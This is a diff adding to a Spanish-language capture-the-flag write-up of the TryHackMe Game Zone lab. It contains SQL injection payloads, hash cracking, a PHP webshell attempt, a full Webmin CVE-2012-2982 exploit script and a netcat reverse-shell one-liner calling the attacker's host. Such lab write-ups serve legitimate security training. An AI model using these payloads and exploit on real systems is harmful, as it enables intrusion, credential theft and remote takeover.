@@ -312,35 +312,559 @@ Como podemos ver, ahora si tenemos una salida en ambos campos de la tabla. Enton
 Si buscamos por la version de la base de datos en google, nos encontraremos con lo siguiente:
 
 ![[Pasted image 20240721015340.png]]
-Es una base de datos mysql 5.7 en ubuntu xenial. 
+Es una base de datos mysql 5.7 en ubuntu xenial. Ahora, continuemos viendo las bases de datos que tiene con el siguiente comando:
+
+```sql
+' UNION SELECT NULL, table_name, concat(column_name, ' - ', table_name) FROM information_schema.columns WHERE table_schema=database() -- -
+```
+
+esto nos arroja lo siguiente:
+
+![[Pasted image 20240721020748.png]]
+
+vemos que existe la tabla **post** y **users** y podemos ver que la tabla que estamos revisando (post) tiene efectivamente 3 campos de los cuales 1 es numerico y es para el id y luego tenemos una tabla mas interesante que se llama users con un campo username y pwd. Veamos que tiene esa tabla users. 
+
+```sql
+' UNION SELECT NULL, username, pwd FROM users -- -
+```
+
+![[Pasted image 20240721021301.png]]
+
+Nos muestra un nombre de usuario y un hash que parece ser sha-256. veamos si podemos crackearlo de forma simple en **crackstation**
+
+si entramos a esta web: https://crackstation.net/ podremos ver este resultado al momento de poner el hash:
+
+![[Pasted image 20240721021657.png]]
+
+Como podemos ver, si pudimos romper ese hash y tenemos nuestra clave. Pero, si queremos hacerlo con john y rockyou o con hashcat debemos utilizar los siguientes comandos:
 
 
+```bash
+touch hash && echo 'ab5db915fc9cea6c78df88106c6500c57f2b52901ca6c0c6218f04122c3efd14' > hash
+```
 
+```bash
+john --format=Raw-SHA256 --wordlist=/usr/share/wordlists/seclists/Passwords/Leaked-Databases/rockyou.txt hash
 
+Warning! john.conf section [list.rules:best64] is multiple declared.
+Using default input encoding: UTF-8
+Loaded 1 password hash (Raw-SHA256 [SHA256 128/128 AVX 4x])
+Warning: poor OpenMP scalability for this hash type, consider --fork=4
+Will run 4 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+videogamer124    (?)     
+1g 0:00:00:00 DONE (2024-07-21 02:20) 3.030g/s 8837Kp/s 8837Kc/s 8837KC/s vimivera..veluasan
+Use the "--show --format=Raw-SHA256" options to display all of the cracked passwords reliably
+Session completed. 
+```
 
+Ahi obtenemos el resultado con john utilizando rockyou y la clave es: videogamer124
 
+Tenemos las credenciales agent47:videogamer124
+
+Ahora podemos responder estas preguntas: 
+
+![[Pasted image 20240721023320.png]]
+
+ahora que ya tenemos credenciales, probemos si esas nos serviran en el ssh que tienen abierto:
+
+```
+ssh agent47@10.10.144.74
+```
+
+![[Pasted image 20240721023955.png]]
+Las credenciales nos sirvieron. Pero, si tenemos una inyeccion sql y no tenemos ssh. Podriamos obtener una shell con esa inyeccion? 
+
+La respuesta es si y al saber que se tiene un servidor apache y que tenemos php disponible, podemos subir un cmd y ejecutarlo desde nuestro navegador y luego transformarlo en una shell. 
+
+Veamoslo:
+
+```sql
+'union select null,"<?php+system($_GET['cmd']);?>",null into OUTFILE "/var/www/html/webshell.php" -- -
+```
+
+esto, nos dice lo siguiente:
+
+![[Pasted image 20240721024917.png]]
+
+Existe una restriccion para obtener una shell de esta manera y por lo tanto seguiremos el camino que ya conseguimos con el ssh. Eso si,  somos root en la base de datos por ende, podriamos jugar con los privilegios y otras cosas para empezar a leer archivos e investigar mas. Pero, por ahora seguiremos con el ssh. 
 
 ---
-
-# Lateral Movement to user
-## Local Enumeration
-Lorem ipsum dolor sit amet, consectetur adipiscing elit. Quisque sit amet tortor scelerisque, fringilla sapien sit amet, rhoncus lorem. Nullam imperdiet nisi ut tortor eleifend tincidunt. Mauris in aliquam orci. Nam congue sollicitudin ex, sit amet placerat ipsum congue quis. Maecenas et ligula et libero congue sollicitudin non eget neque. Phasellus bibendum ornare magna. Donec a gravida lacus.
-
-## Lateral Movement vector
-Lorem ipsum dolor sit amet, consectetur adipiscing elit. Quisque sit amet tortor scelerisque, fringilla sapien sit amet, rhoncus lorem. Nullam imperdiet nisi ut tortor eleifend tincidunt. Mauris in aliquam orci. Nam congue sollicitudin ex, sit amet placerat ipsum congue quis. Maecenas et ligula et libero congue sollicitudin non eget neque. Phasellus bibendum ornare magna. Donec a gravida lacus.
-
----
-
 # Privilege Escalation
-## Local Enumeration
-Lorem ipsum dolor sit amet, consectetur adipiscing elit. Quisque sit amet tortor scelerisque, fringilla sapien sit amet, rhoncus lorem. Nullam imperdiet nisi ut tortor eleifend tincidunt. Mauris in aliquam orci. Nam congue sollicitudin ex, sit amet placerat ipsum congue quis. Maecenas et ligula et libero congue sollicitudin non eget neque. Phasellus bibendum ornare magna. Donec a gravida lacus.
 
-## Privilege Escalation vector
-Lorem ipsum dolor sit amet, consectetur adipiscing elit. Quisque sit amet tortor scelerisque, fringilla sapien sit amet, rhoncus lorem. Nullam imperdiet nisi ut tortor eleifend tincidunt. Mauris in aliquam orci. Nam congue sollicitudin ex, sit amet placerat ipsum congue quis. Maecenas et ligula et libero congue sollicitudin non eget neque. Phasellus bibendum ornare magna. Donec a gravida lacus.
+En la escalada, tryhackme nos guia un poco hacia los servicios internos que tiene esta maquina. Pero, como procedimiento, revisaremos lo basico que es saber si tenemos permisos con sudo, que nos arroja id, la version del kernel, SUID, capabilities, tareas cron, escritura en carpetas y por ultimo, la version del sistema para corroborar lo que decia al inicio con ubuntu 16.04 xenial
+
+### id
+```bash
+agent47@gamezone:~$ id
+uid=1000(agent47) gid=1000(agent47) groups=1000(agent47),4(adm),24(cdrom),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare)
+
+```
+
+### SUID
+
+
+```bash
+agent47@gamezone:~$ find / -perm -u=s -type f 2>/dev/null
+/usr/bin/newgrp
+/usr/bin/passwd
+/usr/bin/chsh
+/usr/bin/newuidmap
+/usr/bin/chfn
+/usr/bin/gpasswd
+/usr/bin/newgidmap
+/usr/bin/pkexec
+/usr/bin/at
+/usr/bin/sudo
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
+/usr/lib/snapd/snap-confine
+/usr/lib/openssh/ssh-keysign
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/policykit-1/polkit-agent-helper-1
+/bin/ntfs-3g
+/bin/umount
+/bin/fusermount
+/bin/mount
+/bin/ping
+/bin/su
+/bin/ping6
+```
+
+El SUID interesante es pkexec. Pero, si hacemos sudo -l nos daremos cuenta que no contamos con permisos de sudo por ende la elevacion de privilegios no va por ahi. 
+### Sistema
+
+```bash
+cat /etc/os-release
+
+NAME="Ubuntu"
+VERSION="16.04.6 LTS (Xenial Xerus)"
+ID=ubuntu
+ID_LIKE=debian
+PRETTY_NAME="Ubuntu 16.04.6 LTS"
+VERSION_ID="16.04"
+HOME_URL="http://www.ubuntu.com/"
+SUPPORT_URL="http://help.ubuntu.com/"
+BUG_REPORT_URL="http://bugs.launchpad.net/ubuntu/"
+VERSION_CODENAME=xenial
+UBUNTU_CODENAME=xenial
+```
+
+Y efectivamente. Es un ubuntu xenial 16.04
+
+### Kernel
+
+```bash
+uname -a
+Linux gamezone 4.4.0-159-generic #187-Ubuntu SMP Thu Aug 1 16:28:06 UTC 2019 x86_64 x86_64 x86_64 GNU/Linu
+```
+
+la version me dice que si hay exploits disponibles veamos que nos dice searchsploit:
+
+![[Pasted image 20240721031853.png]]
+
+Se puede ver que si hay disponibles pero no para nuestra version exacta. El problema de ejecutar exploits para elevar privilegios con el kernel, es que las maquinas se cuelgan al ejecutarlo y es algo muy agresivo si es que no lo probamos de forma local antes de ejecutarlo en remoto. Pero, tenemos la informacion de que nuestro kernel si puede ser vulnerable si adaptamos alguno de estos exploits que mas se nos acerquen. 
+
+### Directorios con permisos de escritura
+
+```bash
+find / -writable -type d 2>/dev/null
+/var/crash
+/var/tmp
+/var/lib/php/sessions
+/var/lib/lxcfs/proc
+/var/lib/lxcfs/cgroup
+/var/lib/lxcfs/cgroup/name=systemd/user.slice/user-1000.slice/user@1000.service
+/var/lib/lxcfs/cgroup/name=systemd/user.slice/user-1000.slice/user@1000.service/init.scope
+/proc/2442/task/2442/fd
+/proc/2442/fd
+/proc/2442/map_files
+/sys/fs/cgroup/systemd/user.slice/user-1000.slice/user@1000.service
+/sys/fs/cgroup/systemd/user.slice/user-1000.slice/user@1000.service/init.scope
+/tmp
+/tmp/.X11-unix
+/tmp/.XIM-unix
+/tmp/.ICE-unix
+/tmp/.Test-unix
+/tmp/.font-unix
+/home/agent47
+/home/agent47/.cache
+/run/user/1000
+/run/user/1000/systemd
+/run/lock
+/dev/mqueue
+/dev/shm
+
+```
+
+### Capabilities
+
+```bash
+agent47@gamezone:~$ /usr/sbin/getcap -r / 2>/dev/null 
+agent47@gamezone:~$ 
+
+```
+
+No tenemos nada en capabilities
+
+### Tareas programadas
+
+```bash
+agent47@gamezone:~$ ls -lah /etc/cron*
+-rw-r--r-- 1 root root  722 Apr  5  2016 /etc/crontab
+
+/etc/cron.d:
+total 24K
+drwxr-xr-x  2 root root 4.0K Aug 14  2019 .
+drwxr-xr-x 98 root root 4.0K Aug 19  2019 ..
+-rw-r--r--  1 root root  589 Jul 16  2014 mdadm
+-rw-r--r--  1 root root  670 Jun 22  2017 php
+-rw-r--r--  1 root root  102 Apr  5  2016 .placeholder
+-rw-r--r--  1 root root  191 Aug 14  2019 popularity-contest
+
+/etc/cron.daily:
+total 64K
+drwxr-xr-x  2 root root 4.0K Aug 16  2019 .
+drwxr-xr-x 98 root root 4.0K Aug 19  2019 ..
+-rwxr-xr-x  1 root root  539 Jun 11  2018 apache2
+-rwxr-xr-x  1 root root  376 Mar 31  2016 apport
+-rwxr-xr-x  1 root root 1.5K Oct  9  2018 apt-compat
+-rwxr-xr-x  1 root root   77 Jan 21  2015 apt-show-versions
+-rwxr-xr-x  1 root root  355 May 22  2012 bsdmainutils
+-rwxr-xr-x  1 root root 1.6K Nov 26  2015 dpkg
+-rwxr-xr-x  1 root root  372 May  5  2015 logrotate
+-rwxr-xr-x  1 root root 1.3K Nov  6  2015 man-db
+-rwxr-xr-x  1 root root  539 Jul 16  2014 mdadm
+-rwxr-xr-x  1 root root  435 Nov 18  2014 mlocate
+-rwxr-xr-x  1 root root  249 Nov 12  2015 passwd
+-rw-r--r--  1 root root  102 Apr  5  2016 .placeholder
+-rwxr-xr-x  1 root root 3.4K Feb 26  2016 popularity-contest
+-rwxr-xr-x  1 root root  214 Dec  7  2018 update-notifier-common
+
+/etc/cron.hourly:
+total 12K
+drwxr-xr-x  2 root root 4.0K Aug 14  2019 .
+drwxr-xr-x 98 root root 4.0K Aug 19  2019 ..
+-rw-r--r--  1 root root  102 Apr  5  2016 .placeholder
+
+/etc/cron.monthly:
+total 12K
+drwxr-xr-x  2 root root 4.0K Aug 14  2019 .
+drwxr-xr-x 98 root root 4.0K Aug 19  2019 ..
+-rw-r--r--  1 root root  102 Apr  5  2016 .placeholder
+
+/etc/cron.weekly:
+total 24K
+drwxr-xr-x  2 root root 4.0K Aug 14  2019 .
+drwxr-xr-x 98 root root 4.0K Aug 19  2019 ..
+-rwxr-xr-x  1 root root   86 Apr 13  2016 fstrim
+-rwxr-xr-x  1 root root  771 Nov  6  2015 man-db
+-rw-r--r--  1 root root  102 Apr  5  2016 .placeholder
+-rwxr-xr-x  1 root root  211 Dec  7  2018 update-notifier-common
+```
+
+Nosotros particularmente no tenemos ninguna tarea programada. 
+
+### Red
+
+```bash
+agent47@gamezone:~$ ss -tuln
+Netid State      Recv-Q Send-Q                                                                      Local Address:Port                                                                                     Peer Address:Port              
+udp   UNCONN     0      0                                                                                       *:10000                                                                                               *:*                  
+udp   UNCONN     0      0                                                                                       *:68                                                                                                  *:*                  
+tcp   LISTEN     0      128                                                                                     *:10000                                                                                               *:*                  
+tcp   LISTEN     0      128                                                                                     *:22                                                                                                  *:*                  
+tcp   LISTEN     0      80                                                                              127.0.0.1:3306                                                                                                *:*                  
+tcp   LISTEN     0      128                                                                                    :::80                                                                                                 :::*                  
+tcp   LISTEN     0      128                                                                                    :::22                                                                                                 :::*            
+
+```
+
+En el escaneo con nmap, tenemos el puerto 22 y el 80. Pero, el puerto 10000? 
+
+Ese debemos traerlo y revisarlo en nuestra maquina. 
+
+```html
+gent47@gamezone:~$ curl -X GET http://localhost:10000
+<!doctype html public "-//W3C//DTD HTML 3.2 Final//EN">
+<html>
+<head>
+<link rel='stylesheet' type='text/css' href='/unauthenticated/style.css' />
+<script type='text/javascript' src='/unauthenticated/toggleview.js'></script>
+<script>
+var rowsel = new Array();
+</script>
+<script type='text/javascript' src='/unauthenticated/sorttable.js'></script>
+<meta http-equiv="Content-Type" content="text/html; Charset=iso-8859-1">
+<title>Login to Webmin</title></head>
+<body bgcolor=#ffffff link=#0000ee vlink=#0000ee text=#000000    onLoad='document.forms[0].pass.value = ""; document.forms[0].user.focus()'>
+<table class='header' width=100%><tr>
+<td id='headln2l' width=15% valign=top align=left></td>
+<td id='headln2c' align=center width=70%><font size=+2></font></td>
+<td id='headln2r' width=15% valign=top align=right></td></tr></table>
+<p><center>
+
+<form class='ui_form' action='/session_login.cgi' method=post >
+<input class='ui_hidden' type=hidden name="page" value="/">
+<table class='shrinkwrapper' width=40% class='loginform'>
+<tr><td>
+<table class='ui_table' width=40% class='loginform'>
+<thead><tr class='ui_table_head'><td><b>Login to Webmin</b></td></tr></thead>
+<tbody> <tr class='ui_table_body'> <td colspan=1><table width=100%>
+<tr class='ui_table_row'>
+<td valign=top colspan=2 align=center class='ui_value'>You must enter a username and password to login to the Webmin server on <tt>localhost</tt>.</td>
+</tr>
+<tr class='ui_table_row'>
+<td valign=top  class='ui_label'><b>Username</b></td>
+<td valign=top colspan=1  class='ui_value'><input class='ui_textbox' name="user" value="" size=20  ></td>
+</tr>
+<tr class='ui_table_row'>
+<td valign=top  class='ui_label'><b>Password</b></td>
+<td valign=top colspan=1  class='ui_value'><input class='ui_password' type=password name="pass" value="" size=20  ></td>
+</tr>
+<tr class='ui_table_row'>
+<td valign=top  class='ui_label'><b> </b></td>
+<td valign=top colspan=1  class='ui_value'><input class='ui_checkbox' type=checkbox name="save" value="1"  id="save_1" > <label for="save_1">Remember login permanently?</label>
+</td>
+</tr>
+</tbody></table></td></tr></table>
+</td></tr>
+</table>
+
+<input class='ui_submit' type=submit value="Login">
+<input type=reset value="Clear">
+</form>
+</center>
+
+<script>
+if (window != window.top) {
+        window.top.location = window.location;
+        }
+</script>
+</div><p>
+<br>
+</body></html>
+```
+
+para traerlo, solo aplicamos este comando:
+
+```bash
+ssh -L 80:localhost:10000 agent47@10.10.144.74
+
+```
+
+Esto significa que en nuestra maquina en el puerto 80 veremos lo que hay en el puerto 10000 de la maquina victima. 
+
+esto es lo que vemos:
+
+![[Pasted image 20240721043150.png]]
+
+si usamos las credenciales del ssh, podemos entrar aqui:
+![[Pasted image 20240721043328.png]]
+
+Con esto ya podemos responder las preguntas de la exposicion del servicio:
+
+![[Pasted image 20240721043603.png]]
+
+ahora nos falta escalar privilegios. Para ello, debemos revisar la version de este webmin y ver que nos trae. 
+
+
+```python
+#!/usr/bin/env python3
+# https://github.com/JohnHammond/CVE-2012-2982/blob/master/CVE-2012-2982.py
+import argparse
+import random
+import string
+import sys
+import urllib.parse
+
+import requests
+
+
+def get_args():
+
+    parser = argparse.ArgumentParser()
+
+    parser.add_argument(
+        "-t", "--target", help="The host of the Webmin 1.580 target", required=True
+    )
+    parser.add_argument(
+        "-p",
+        "--port",
+        help="The port that hosts Webmin 1.580",
+        required=False,
+    )
+    parser.add_argument(
+        "-U",
+        "--username",
+        help="The username to login to Webmin",
+        required=True,
+    )
+    parser.add_argument(
+        "-P",
+        "--password",
+        help="The password to login to Webmin",
+        required=True,
+    )
+    parser.add_argument(
+        "-c",
+        "--command",
+        help="The command to run on the target",
+        required=True,
+    )
+    parser.add_argument(
+        "-s",
+        "--ssl",
+        help="Whether or not we should use SSL",
+        action="store_true",
+    )
+
+    args = parser.parse_args()
+    return args
+
+
+class Exploit:
+    def __init__(self, args):
+        self.args = args
+        self.validate_args()
+
+        self.username = self.args.username
+        self.password = self.args.password
+        self.command = self.args.command
+
+    def run(self):
+
+        print(f"[+] targeting host {self.host} on port {self.port}")
+        self.url = f"{self.schema}{self.host}:{self.port}"
+
+        login_session = self.login()
+        if not login_session:
+            sys.stderr.write(
+                f"[!] failed to login with user '{self.username}' and pw '{self.password}'\n"
+            )
+            return False
+
+        print(
+            f"[+] successfully logged in with user '{self.username}' and pw '{self.password}'"
+        )
+
+        self.execute_command()
+        print(f"[+] executed '{self.command}' on '{self.host}'")
+
+    def validate_args(self):
+        self.host = self.args.target
+
+        potential_schemas = ["http://", "https://"]
+
+        if not self.args.ssl:
+            for schema in potential_schemas:
+                if self.host.startswith(schema):
+                    break
+            else:
+                self.schema = potential_schemas[0]
+        else:
+            self.schema = potential_schemas[bool(args.ssl)]
+
+        self.host = self.host.removeprefix(schema)
+
+        if not self.args.port:
+            if ":" in self.args.target:
+                self.host, self.port = self.host.split(":")
+            else:
+                sys.stderr.write(
+                    "[!] port is required (either pass -p or use IP:PORT syntax)"
+                )
+                exit(-1)
+        else:
+            self.host = self.args.target.removesuffix("/")
+            self.port = self.args.port
+
+        self.host = self.host.removesuffix(f":{self.port}")
+
+    def login(self):
+        self.session = requests.Session()
+
+        try:
+            response = self.session.post(
+                self.url + "/session_login.cgi",
+                data={
+                    "user": self.username,
+                    "pass": self.password,
+                },
+                cookies={"testing": "1"},
+                allow_redirects=False,
+            )
+        except (ConnectionRefusedError, requests.exceptions.ConnectionError) as e:
+            sys.stderr.write(f"[!] error: {e.args[0]}\n")
+            exit(-1)
+
+        if "sid" in self.session.cookies:
+            return not self.session.cookies["sid"] == 1
+
+    def execute_command(self):
+        random_string = "".join(
+            [random.choice(string.ascii_letters) for _ in range(random.randint(3, 12))]
+        )
+
+        self.session.get(
+            self.url
+            + f"/file/show.cgi/bin/{random_string}|{urllib.parse.quote(self.command)}|"
+        )
+
+
+if __name__ == "__main__":
+    exploit = Exploit(get_args())
+    success = exploit.run()
+
+    if not success:
+        sys.exit(1)
+```
+
+Con este exploit, se puede escalar privilegios sin metasploit:
+
+lo nombramos y usamos el siguiente comando:
+
+```bash
+python jm.py -t localhost -p 80 -U agent47 -P videogamer124 -c "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 10.13.62.1 443 >/tmp/f"
+```
+
+Nos ponemos en escucha con netcat:
+
+```bash
+sudo nc -lvnp 443 
+```
+
+finalmente recibimos la shell:
+
+```bash
+root@gamezone:/usr/share/webmin/file/# 
+```
+
+le hacemos un tratamiento:
+
+```bash
+python -c 'import pty;pty.spawn("/bin/bash")'
+export TERM=xterm
+export SHELL=bash
+```
+
+luego, presionamos CTRL+ Z 
+
+```bash
+stty raw -echo;fg
+reset xterm
+```
+
+Con esto, tenemos una bash totalmente funcional que al momento de presionar CTRL + C no se nos va a caer. Tambien, podemos usar CTRL +L e ir atras y adelante en la bash y ya es mas comodo trabajar. Con esto, ya podemos decir que hemos tomado el control de esta maquina! 
+
 
 ---
-
 # Trophy & Loot
-user.txt
+user.txt:
 
-root.txt
+![[Pasted image 20240721050730.png]]
+
+
+root.txt: 
+
+![[Pasted image 20240721050628.png]]
